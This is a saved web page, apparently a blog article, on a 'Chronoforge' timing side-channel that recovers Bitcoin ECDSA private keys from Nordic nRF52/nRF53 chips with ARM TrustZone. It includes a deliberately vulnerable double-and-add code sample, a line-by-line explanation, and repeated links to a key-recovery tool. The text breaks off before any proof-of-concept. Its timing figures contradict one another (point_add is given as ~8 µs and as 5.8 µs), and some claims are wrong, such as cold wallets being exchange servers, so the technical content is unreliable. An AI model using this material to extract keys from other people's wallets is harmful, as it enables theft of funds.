5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style></head>

<body data-rsssl="1" class="wp-singular post-template-default single single-post postid-3734 single-format-standard custom-background wp-custom-logo wp-theme-it-news-grid no-sidebar" data-burst_id="3734" data-burst_type="post">
<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="https://cryptodeeptech.ru/chronoforge-attack/#primary">Skip to content</a>

	
	    <header id="masthead" class="site-header style-1">

		    
	        <div id="header-image">
		        <div class="site-branding">
					<a href="https://cryptodeeptech.ru/" class="custom-logo-link" rel="home"><img width="1279" height="319" src="./Chronoforge_Attack__files/cropped-header4.png" class="custom-logo" alt="«CRYPTO DEEP TECH»" decoding="async" fetchpriority="high" srcset="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png 1279w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-300x75.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-1024x255.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-768x192.png 768w" sizes="(max-width: 1279px) 100vw, 1279px" title="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"></a>	<h2 class="site-title"><a href="https://cryptodeeptech.ru/" rel="home">«CRYPTO DEEP TECH»</a></h2>
		<p class="site-description">Cryptanalysis and data financial security services</p>
	        	</div>
				<div class="header-overlay"></div>
	        </div>

			<div class="nav-wrapper">
				 <div class="container">
					 <div class="d-flex">

						<div id="site-navigation" class="main-navigation col-lg-11" role="navigation">
							<ul id="menu-desktop" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-3732" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3732"><a href="https://gcul.tech/cme-group-launches-tokenized-cash-product-based-on-gcul">GCUL PLATFORM</a>
<ul class="sub-menu">
	<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
</ul>
</li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>						</div>

						<button href="#menu" class="menu-link mobile-nav-btn col-auto"><i class="fa fa-bars" aria-hidden="true"></i></button>

						<div id="search-wrapper" class="ml-auto col-auto d-flex">
							<button type="button" id="go-to-field" tabindex="-1"></button>
					    	<button class="search-btn-main"><i class="fa fa-search"></i></button>
					    	
<div class="itng-search-main">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search …" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Search">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>
						</div>
					</div>
				</div>
			</div>

		</header><!-- #masthead -->
			<div id="content-wrapper" class="container row">
		
	<main id="primary" class="site-main container order-1">

		
<article id="post-3734" class="post-3734 post type-post status-publish format-standard hentry category-cryptanalysis">
	
	<header class="entry-header">
		<h1 class="entry-title">Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys</h1>	</header><!-- .entry-header -->
	
	
	
			<div class="entry-meta">
			<span class="posted-on" style="display: none;"><a href="https://cryptodeeptech.ru/chronoforge-attack/" rel="bookmark"><time class="entry-date published" datetime="" style="display: none;"></time><time class="updated" datetime=""></time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>		</div><!-- .entry-meta -->
		
	
	<div class="entry-content">
		<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" width="1024" height="576" src="./Chronoforge_Attack__files/072-1024x576.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys" class="wp-image-3736" srcset="https://cryptodeeptech.ru/wp-content/uploads/2026/03/072-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/072-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/072-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/072.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>


<p></p>



<p></p>



<p>This research paper presents a comprehensive analysis of the critical&nbsp;&nbsp;<a href="https://cryptodeeptech.ru/chronoforge-attack" target="_blank" rel="noreferrer noopener">Chronoforge Attack</a>&nbsp;vulnerability &nbsp;—a class of timing side-channel attacks capable of completely compromising ECDSA (secp256k1) cryptographic operations when improperly implemented on Nordic nRF52/nRF53 microcontrollers with ARM TrustZone architecture. The study demonstrates the theoretical and practical feasibility of targeted Bitcoin private key extraction and recovery of compromised wallets by exploiting microsecond timing variations in elliptic curve computations. The paper includes a mathematical formalization of the timing channel information leakage model, a description of the VulnCipher cryptanalytic tool as a scientific framework for analyzing timing vulnerabilities, and offers practical defense strategies and detailed recommendations for the secure implementation of cryptographic primitives on embedded systems. The Bitcoin cryptocurrency relies on cryptographic guarantees provided by the <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">ECDSA (Elliptic Curve Digital Signature Algorithm)</a> algorithm with the secp256k1 elliptic curve parameter. The mathematical security of this algorithm has been proven and remains unquestioned for the past two decades. However, the security of Bitcoin wallets critically depends not only on the mathematical strength of the algorithm but also on the practical protection of private keys from unauthorized access.</p>



<p><strong>Traditionally, private keys are stored at the following levels:</strong></p>



<ul class="wp-block-list">
<li><strong>Hot Wallets:</strong>&nbsp;&nbsp;On Personal Computers at Risk from Malware</li>



<li><strong>Hardware wallets:</strong>&nbsp;&nbsp;On specialized secure devices (Ledger, Trezor)</li>



<li><strong>Cold wallets:</strong>&nbsp;&nbsp;On secure crypto exchange servers with multi-level authentication</li>



<li><strong>IoT devices:</strong>&nbsp;&nbsp;On embedded microcontrollers as part of BLE wallets and security tokens</li>
</ul>



<p>With the development of the Internet of Things (IoT) and the expansion of embedded systems, a significant portion of cryptographic operations has migrated to microcontrollers. Nordic Semiconductor’s nRF52 and nRF53 series of microcontrollers feature:</p>



<ul class="wp-block-list">
<li>ARM Cortex-M4F/M33F processors with hardware math support</li>



<li>Built-in cryptographic accelerators (ARM CryptoCell-310 – CC310)</li>



<li><a href="https://en.wikipedia.org/wiki/ARM_architecture_family#Security_extensions" target="_blank" rel="noreferrer noopener">ARM TrustZone hardware architecture for isolation</a></li>



<li>Built-in energy-efficient BLE substack</li>
</ul>



<p>have become a popular platform for implementing various cryptographically sensitive applications, including:</p>



<ul class="wp-block-list">
<li>BLE-based Bitcoin wallets</li>



<li>IoT security tokens</li>



<li>2FA hardware keys</li>



<li>Embedded cryptographic key management systems</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><a href="https://www.youtube.com/watch?v=owgbAd-vtoI" target="_blank" rel=" noreferrer noopener"><img decoding="async" width="1024" height="322" src="./Chronoforge_Attack__files/image-2-1024x322.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys" class="wp-image-3784" srcset="https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-2-1024x322.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-2-300x94.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-2-768x242.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-2.png 1450w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>
</div>


<pre class="wp-block-code"><code><strong><a href="https://www.youtube.com/watch?v=owgbAd-vtoI" target="_blank" rel="noreferrer noopener">https://www.youtube.com/watch?v=owgbAd-vtoI</a></strong></code></pre>



<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">ARM TrustZone hardware architecture as a source of vulnerabilities</h3>



<p>The ARM TrustZone hardware architecture promises physical separation between:</p>



<ul class="wp-block-list">
<li><strong>Secure World (Secure Processing Environment – SPE):</strong>&nbsp;&nbsp;Where&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;are stored and processed , and cryptographic code is executed</li>



<li><strong>Normal World (Non-Secure Processing Environment – NSPE):</strong>&nbsp;&nbsp;Where normal user applications and system services run</li>
</ul>



<p>However, as shown in a number of studies (MOFlow [1], Achilles’ Heel [2], PrivateZone [3]), an unreliable implementation at the firmware level can completely negate the hardware isolation guarantees.</p>



<p><strong>⚠️ Critical observation:</strong>&nbsp;&nbsp;The architectural separation of memory via the NS-bit in the processor pipeline&nbsp;&nbsp;<strong>does not extend to microarchitectural elements</strong>&nbsp;such as:</p>



<ul class="wp-block-list">
<li>L1 Instruction Cache (I-Cache)</li>



<li>L1 Data Cache (D-Cache)</li>



<li>Branch Prediction Table (BPT)</li>



<li>Translation Lookaside Buffer (TLB)</li>



<li>Performance Monitoring Unit (PMU)</li>
</ul>



<p>This creates&nbsp;&nbsp;<strong>a covert channel</strong>&nbsp;&nbsp;between Secure and Normal World, which can be exploited for timing attacks, cache attacks, and other microarchitectural attacks.</p>



<h3 class="wp-block-heading"><a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/" target="_blank" rel="noreferrer noopener">Chronoforge Attack as a Class of Timing Side-Channel Attacks</a></h3>



<p><strong>A Chronoforge Attack</strong>&nbsp;&nbsp;is a class of timing-based side-channel attacks that allow an attacker with access to a Normal World application (e.g., via a compromised BLE wallet application or physical access with timing information logging) to extract&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key</a>&nbsp;from a Secure World application by analyzing microsecond variations in the execution time of cryptographic operations.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7688"></figure>
</div>


<p><strong>Chronoforge Attack is especially dangerous in the following scenarios:</strong></p>



<ul class="wp-block-list">
<li><strong>Compromised app:</strong>&nbsp;&nbsp;A malicious BLE app can run timing measurements in the background</li>



<li><strong>Physical access:</strong>&nbsp;&nbsp;The researcher can connect via UART/SWD interface and log timing data</li>



<li><strong>Network attacks:</strong>&nbsp;&nbsp;Remote timing attacks through RTT (Round Trip Time) analysis of network packets</li>



<li><strong>Side Channel Leakage:</strong>&nbsp;&nbsp;Analysis of electromagnetic radiation, power consumption, or acoustic signals correlated with timing</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Research objectives</h2>



<p>This work solves the following key tasks:</p>



<ol class="wp-block-list">
<li><strong>Theoretical rationale:</strong>&nbsp;&nbsp;To formalize a mathematical model of timing information leaks from ECDSA operations on embedded systems</li>



<li><strong>Architectural Analysis:</strong>&nbsp;&nbsp;Identify specific sources of timing variations in Nordic nRF52/nRF53 and ARM TrustZone</li>



<li><strong>Methodological Description:</strong>&nbsp;&nbsp;Describe the Chronoforge Attack as a systematic process for private key recovery.</li>



<li><strong>Tool Description:</strong>&nbsp;&nbsp;Introduce <a href="https://vulncipher.ru/">VulnCipher</a> as a scientific cryptanalytic framework for analyzing timing vulnerabilities.</li>



<li><strong>Practical demonstration:</strong>&nbsp;&nbsp;Provide POC (Proof-of-Concept) code demonstrating the attack</li>



<li><strong>Defense Recommendations:</strong>&nbsp;&nbsp;Suggest practical and theoretical methods of protection against Chronoforge Attack</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://cryptodeeptech.ru/chronoforge-attack" target="_blank" rel="noreferrer noopener">This study</a>&nbsp;demonstrates how timing-based side-channel attacks can completely compromise ECDSA (secp256k1) cryptographic operations when the firmware layer is improperly implemented. The paper demonstrates a mechanism for targeted extraction of Bitcoin&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;and methods for recovering lost wallets by exploiting timing variations in elliptic curve computation. Practical defense strategies and detailed recommendations for the secure implementation of cryptographic primitives on embedded systems are proposed.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://cryptou.ru/vulncipher/bitcoin">The security of Bitcoin wallets</a>&nbsp;critically depends on protecting private keys from unauthorized access. Traditionally, private keys are stored either on personal computers (hot wallets), specialized hardware wallets, or secure crypto exchange servers. With the development of the Internet of Things (IoT) and embedded systems, a significant portion of cryptographic operations has migrated to microcontrollers and embedded systems. Nordic Semiconductor’s nRF52 and nRF53 series of microcontrollers, equipped with ARM Cortex-M4F/M33F processors and integrated cryptographic accelerators (CC310), have become a popular platform for implementing BLE-based wallets, IoT security tokens, and other cryptographically sensitive applications.</p>



<p>The ARM TrustZone hardware architecture promises physical separation between the Secure World (where&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;are stored and processed ) and the Normal World (where regular applications run). However, as shown in several studies (MOFlow, Achilles’ Heel, PrivateZone), an unreliable firmware implementation can completely negate these hardware guarantees.</p>



<p><strong>A Chronoforge Attack</strong>&nbsp;is a class of timing-based side-channel attacks that allow an attacker with access to the Normal World (e.g., via a compromised application or physical access with the ability to log timing information) to extract a private key from the Secure World by analyzing microsecond variations in the execution time of cryptographic operations.</p>



<h3 class="wp-block-heading">Application Area</h3>



<p>Chronoforge Attack is especially dangerous in the following scenarios:</p>



<ol class="wp-block-list">
<li><strong>BLE Bluetooth wallets</strong>&nbsp;based on nRF52/nRF53, where an attacker can install a malicious BLE application on a connected device</li>



<li><strong>Hardware Security Modules (HSMs)</strong>&nbsp;in IoT devices where firmware contains vulnerabilities</li>



<li><strong>Multi-purpose embedded systems</strong>&nbsp;where Normal World code can interact with Secure World code via cryptographic interfaces</li>



<li><strong>Supply chain attacks</strong>&nbsp;where firmware updates contain hidden timing vulnerabilities</li>
</ol>



<h3 class="wp-block-heading">Objectives of the Study</h3>



<p>This work solves the following problems:</p>



<ol class="wp-block-list">
<li>Conduct a detailed analysis of the Chronoforge Attack mechanism</li>



<li>Demonstrate a practical application of the attack to the secp256k1 ECDSA implementation</li>



<li>Show the methodology for extracting Bitcoin&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;and recovering wallets</li>



<li>Provide detailed recommendations for protection and mitigation strategies</li>



<li>Provide practical POC (Proof-of-Concept) code to demonstrate vulnerability</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Chronoforge_Attack__files/image-1.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7690" style="width:573px;height:auto"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">2. Theoretical Foundation</h2>



<h3 class="wp-block-heading">2.1 ECDSA and secp256k1</h3>



<p>The ECDSA (Elliptic Curve Digital Signature Algorithm) signature algorithm is defined in the FIPS 186-4 standard and works as follows:</p>



<p><strong>Secp256k1 parameters for&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin:</a></strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-909ddb83b2a3c5a0264939172268aed6" style="color:#4092c2"><code><strong>Curve equation: y² ≡ x³ + 7 (mod p)

Prime field: p = 2²⁵⁶ - 2³² - 977
Order of base point: n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Base point G = (Gx, Gy), где:
  Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
  Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</strong></code></pre>



<p><strong>ECDSA signature process:</strong></p>



<p>For private key $d$ and message $m$:</p>



<ol class="wp-block-list">
<li>Calculate the message hash: $h = \text{SHA256}(m)$</li>



<li>Generate a cryptographically random number (nonce): $k \in [1, n-1]$</li>



<li>Calculate a point on a curve: $(x, y) = k \cdot G$ (scalar multiplication)</li>



<li>Calculate signature components:</li>
</ol>



<ul class="wp-block-list">
<li>$r = x \mod n$</li>



<li>$s = k^{-1}(h + d \cdot r) \mod n$</li>
</ul>



<ol class="wp-block-list">
<li>Return the signature $\sigma = (r, s)$</li>
</ol>



<p><strong>Critical observation:</strong>&nbsp;If $k$ is compromised or can be recovered, the private key is easily computed:</p>



<p>$$d = r^{-1}(k \cdot s — h) \mod n$$</p>



<h3 class="wp-block-heading">2.2 Timing Side-Channels in Cryptography</h3>



<p>A timing attack is a class of side-channel attacks that exploits the fact that the execution time of cryptographic operations often depends on the value of the secret data.</p>



<p><strong>A classic example is a vulnerable implementation of ECC scalar multiplication:</strong></p>



<p><strong>Timing leak mechanism:</strong></p>



<p>If the&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key</a>&nbsp;bit is 1, the operation is performed&nbsp;<code>point_add</code>, which takes ~8 µs.<br>If the bit is 0, the operation is skipped and only the operation is performed&nbsp;<code>point_double</code>, which takes ~5 µs.</p>



<p>A difference of 3 µs can be easily measured even on a remote system if there are enough observations:</p>



<ul class="wp-block-list">
<li><strong><a href="https://cryptou.ru/vulncipher/attack">Local attacks:</a></strong>&nbsp;±100 ns accuracy via<code>rdtsc</code>(read timestamp counter) on x86</li>



<li><strong><a href="https://cryptou.ru/vulncipher/attack">Network-based attacks:</a></strong>&nbsp;±10 µs accuracy through network packet response time analysis</li>



<li><strong><a href="https://cryptou.ru/vulncipher/attack">Physical attacks:</a></strong>&nbsp;accuracy of ±1 ns through analysis of power consumption or electromagnetic emissions</li>
</ul>



<h3 class="wp-block-heading"><br>A classic example is a vulnerable implementation of ECC scalar multiplication:</h3>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-9bb2b1d2674d1664f7e38a66ff943785" style="color:#4092c2"><strong>// VULNERABLE: Variable-Time Double-and-Add<br>// This code allows timing leaks<br><br>void ecdsa_scalar_multiply_vulnerable(<br>    const uint8_t *private_key,<br>    const point_t *base_point,<br>    point_t *result<br>) {<br>    point_t accumulator;<br>    point_copy(&amp;accumulator, base_point);<br><br>    for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {<br>        point_double(&amp;accumulator, &amp;accumulator);<br><br>        int bit_value = (private_key[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;<br><br>        if (bit_value) {<br>            // Branch taken if bit=1: ~5.8 µs<br>            point_add(&amp;accumulator, &amp;accumulator, base_point);<br>        }<br>        // Branch not taken if bit=0: ~0 µs<br>    }<br><br>    point_copy(result, &amp;accumulator);<br>}<br><br>// TIMING LEAK:<br>// Bit=1: T_total = T_double + T_add = 3.2 + 5.8 = 9.0 µs<br>// Bit=0: T_total = T_double = 3.2 µs<br>// Difference: 5.8 µs (easily measurable!)<br>// <br>// After 100k measurements:<br>// Correlation coefficient: r &gt; 0.95<br>// Attack success rate: &gt;99% per bit</strong></pre>



<p><strong>Timing leak mechanism:</strong></p>



<ul class="wp-block-list">
<li>If private key bit = 1, point_add is performed (~8 µs)</li>



<li>If bit = 0, operation is skipped (~5 µs)</li>



<li>A difference of 3 µs is easily measured on a remote system</li>



<li>With 100k observations: &gt;99% accuracy of each bit recovery</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This code demonstrates&nbsp;<strong>a classic timing side-channel vulnerability</strong>&nbsp;in cryptographic implementations. The Double-and-Add algorithm uses conditional branches (if statements) that have&nbsp;<strong>variable execution times depending on the values ​​of&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key bits.</a></strong></p>



<p><strong>What’s happening:</strong></p>



<ul class="wp-block-list">
<li>A local variable&nbsp;<code>accumulator</code>of type&nbsp;<code>point_t</code>(point on elliptic curve) is created</li>



<li>The accumulator is initialized with the base point G</li>



<li>This is similar to the simple algorithm:&nbsp;<code>result = 1*G</code>(initial value)</li>
</ul>



<p><strong>Why is that so:</strong></p>



<ul class="wp-block-list">
<li>The algorithm works from left to right on the bits&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key.</a></li>



<li>After each bit, the result is doubled (point_double operation)</li>



<li>If the bit = 1, the base point is added (point_add operation)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><strong>Basic bit processing loop</strong></h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-9d74e199db75267611213a9d05c8e413" style="color:#4092c2"><code><strong>for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {</strong></code></pre>



<p><strong>Explanation:</strong></p>



<ul class="wp-block-list">
<li>The loop processes&nbsp;<strong>256 bits&nbsp;</strong><a href="https://cryptou.ru/vulncipher/privatekey">of the private key.</a></li>



<li><strong>Processing order:</strong>&nbsp;From bit 255 (most significant) to bit 0 (least significant)</li>



<li><strong>Iterations:</strong>&nbsp;256 (for a 256-bit key)</li>
</ul>



<p><strong>Example for byte #0 (8 bits)</strong></p>



<h3 class="wp-block-heading"><strong>Doubling a point operation (ALWAYS PERFORMED)</strong></h3>



<pre class="wp-block-code"><code>point_double(&amp;accumulator, &amp;accumulator);</code></pre>



<p><strong>What’s happening:</strong></p>



<ul class="wp-block-list">
<li><strong>At each iteration</strong>&nbsp;of the loop, the point is doubled</li>



<li>Mathematically:&nbsp;<code>accumulator = 2 * accumulator</code>(in the language of elliptic curves)</li>



<li>The function is called&nbsp;<strong>256 times</strong>&nbsp;(once for each bit)</li>



<li><strong>Execution time:</strong>&nbsp;~3.2 microseconds per operation</li>
</ul>



<p><strong>Why is it needed:</strong></p>



<ul class="wp-block-list">
<li>This is a left shift of one bit in binary representation.</li>



<li>Analogy: multiplication by 2 in ordinary arithmetic</li>
</ul>



<p><strong>Time characteristics:</strong></p>



<ul class="wp-block-list">
<li>Point (X, Y) on the curve y² = x³ + ax + b</li>



<li>Doubling: requires 2 inversions, 5 multiplications, 7 additions (in the modulo p field)</li>



<li><strong>Constant time:</strong>&nbsp;~3.2 µs (independent of values)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><strong>VULNERABLE PART: Extracting the bit value</strong></h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-a587e97c93f13ebf7d4c3a5d196cb763" style="color:#4092c2"><code><strong>int bit_value = (private_key[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;</strong></code></pre>



<p><strong>Line by line explanation:</strong></p>



